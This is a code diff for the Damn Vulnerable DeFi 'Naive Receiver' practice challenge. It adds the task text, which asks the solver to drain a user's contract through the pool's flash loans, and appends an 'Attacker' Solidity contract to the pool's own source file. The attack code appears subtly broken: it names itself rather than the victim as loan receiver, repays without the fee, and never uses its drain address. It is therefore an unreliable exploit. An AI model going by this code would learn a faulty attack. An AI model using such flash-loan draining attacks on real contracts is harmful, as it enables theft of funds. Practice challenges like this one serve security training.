@@ -10,6 +10,11 @@ import "./FlashLoanReceiver.sol";
 /**
  * @title NaiveReceiverLenderPool
  * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)
+ There’s a pool with 1000 ETH in balance, offering flash loans. It has a fixed fee of 1 ETH.
+
+ A user has deployed a contract with 10 ETH in balance. It’s capable of interacting with the pool and receiving flash loans of ETH.
+
+ Take all ETH out of the user’s contract. If possible, in a single transaction.
  */
 contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {
 
@@ -65,4 +70,34 @@ contract NaiveReceiverLenderPool is ReentrancyGuard, IERC3156FlashLender {
 
     // Allow deposits of ETH
     receive() external payable {}
+}
+
+
+import "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";
+contract Attacker is IERC3156FlashBorrower {
+
+    address pool;
+    address drainReceiver;
+       address public constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;
+    constructor(address _pool, address _drainReceiver) {
+        pool = _pool;
+        drainReceiver = _drainReceiver;
+    }
+
+    function executeAttack() external {
+        IERC3156FlashLender(pool).flashLoan(this, ETH, 9, bytes(""));
+    }
+
+    function onFlashLoan(
+        address,
+        address,
+        uint256 amount,
+        uint256,
+        bytes calldata
+    ) external returns (bytes32) { 
+
+        SafeTransferLib.safeTransferETH(pool, amount);
+
+        return keccak256("ERC3156FlashBorrower.onFlashLoan");
+    }
 }
